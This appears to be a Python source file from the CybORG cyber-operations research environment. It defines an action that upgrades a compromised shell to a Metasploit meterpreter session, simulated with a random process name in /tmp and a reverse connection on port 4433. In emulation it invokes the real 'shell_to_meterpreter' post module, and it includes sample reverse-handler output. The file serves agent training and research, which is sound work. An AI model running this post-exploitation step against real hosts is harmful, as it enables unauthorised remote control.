# Copyright DST Group. Licensed under the MIT license.
import string
from ipaddress import IPv4Address
import random

from CybORG.Shared.Actions.MSFActionsFolder.MSFAction import MSFAction, lo

# Upgrade a MSF_SHELL session to a METERPRETER session
from CybORG.Shared.Enums import SessionType, AppProtocol
from CybORG.Shared.Observation import Observation


class UpgradeToMeterpreter(MSFAction):
    def __init__(self, session: int, agent: str, target_session: int):
        super().__init__(session=session, agent=agent)
        self.session_to_upgrade = target_session

    def sim_execute(self, state):
        obs = Observation()
        obs.set_success(False)
        if self.session not in state.sessions[self.agent] or self.session_to_upgrade not in state.sessions[self.agent]:
            return obs
        server_session = state.sessions[self.agent][self.session]
        session_to_upgrade = state.sessions[self.agent][self.session_to_upgrade]

        # action fails if either chosen session is not active or of the correct type
        if server_session.session_type != SessionType.MSF_SERVER \
                or not (
                session_to_upgrade.session_type == SessionType.MSF_SHELL or session_to_upgrade.session_type == SessionType.METERPRETER) or not server_session.active \
                or not session_to_upgrade.active:
            return obs

        # find shared subnet of the two hosts
        server_interface = None
        up_interface = None
        # test if the two sessions are on the same host
        if server_session.host == session_to_upgrade.host:
            server_interface = server_session.host.get_interface(interface_name='lo')
        else:
            for upgrade_interface in state.hosts[session_to_upgrade.host].interfaces:
                if upgrade_interface.ip_address != lo:
                    server_session, server_interface = self.get_local_source_interface(local_session=server_session,
                                                                                       remote_address=upgrade_interface.ip_address,
                                                                                       state=state)
                if server_interface is not None:
                    up_interface = upgrade_interface
                    break

        if server_interface is None:
            return obs

        server_address = server_interface.ip_address
        upgrade_address = up_interface.ip_address

        obs.set_success(True)

        new_session = state.add_session(host=session_to_upgrade.host, agent=self.agent,
                                        user=session_to_upgrade.username, session_type="meterpreter",
                                        parent=server_session)
        process = state.hosts[new_session.host].get_process(new_session.pid)
        process.ppid = session_to_upgrade.pid
        process.path = "/tmp/"
        # Randomly generate name:
        process.name = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in range(5))
        local_port = state.hosts[session_to_upgrade.host].get_ephemeral_port()
        new_connection = {"Application Protocol": AppProtocol.TCP,
                          "remote_address": server_address,
                          "remote_port": 4433,
                          "local_address": upgrade_address,
                          "local_port": local_port}
        process.connections.append(new_connection)

        remote_port = {"local_port": 4433,
                       "Application Protocol": AppProtocol.TCP,
                       "local_address": server_address,
                       "remote_address": upgrade_address,
                       "remote_port": local_port
                       }
        state.hosts[server_session.host].get_process(server_session.pid).connections.append(remote_port)

        obs.add_session_info(hostid=str(self.session_to_upgrade), session_id=new_session.ident,
                             session_type=new_session.session_type, agent=self.agent)

        obs.add_process(hostid=str(server_address), local_address=server_address, local_port=4433,
                        remote_address=upgrade_address,
                        remote_port=local_port)
        obs.add_process(hostid=str(self.session_to_upgrade), local_address=upgrade_address, local_port=local_port,
                        remote_address=server_address,
                        remote_port=4433)
        return obs

    def emu_execute(self, session_handler) -> Observation:
        obs = Observation()
        from CybORG.Emulator.Session import MSFSessionHandler
        if type(session_handler) is not MSFSessionHandler:
            obs.set_success(False)
            return obs
        output = session_handler.execute_module(mtype='post', mname='multi/manage/shell_to_meterpreter',
                                                opts={'SESSION': self.session_to_upgrade})
        obs.add_raw_obs(output)
        obs.set_success(False)
        for line in output.split('\n'):
            if '[*] Meterpreter session' in line:
                obs.set_success(True)
                split = line.split(' ')
                # print(list(enumerate(split)))
                session = int(split[3])
                remote_address, remote_port = split[5][1:].split(':')
                local_address, local_port = split[7][:-1].split(':')
                # date = datetime.fromisoformat(split[10] + ' ' + split[11])
                obs.add_session_info(hostid=str(self.session_to_upgrade), session_id=session, agent=self.agent,
                                     session_type='meterpreter')
                obs.add_process(hostid=str(self.session_to_upgrade), local_port=local_port, remote_port=remote_port,
                                local_address=local_address, remote_address=remote_address)
                obs.add_process(hostid=str(remote_address), remote_port=local_port, local_port=remote_port,
                                remote_address=local_address, local_address=remote_address)
                # print(f'session: {session}')
                # print(f'local_port: {local_port}')
                # print(f'local_address: {local_address}')
                # print(f'remote_port: {remote_port}')
                # print(f'remote_address: {remote_address}')
                # print(f'date: {date}')
        '''Example obs
        [*] Upgrading session ID: 1
        [*] Starting exploit/multi/handler
        [*] Started reverse TCP handler on 10.0.20.245:4433 
        [*] Sending stage (985320 bytes) to 10.0.2.164
        [*] Meterpreter session 2 opened (10.0.20.245:4433 -> 10.0.2.164:38182) at 2020-08-03 06:10:00 +0000
        [*] Command stager progress: 100.00% (773/773 bytes)
        [*] Post module execution completed'''
        return obs

    def __str__(self):
        return super(UpgradeToMeterpreter, self).__str__() + f", Shell Session: {self.session_to_upgrade}"
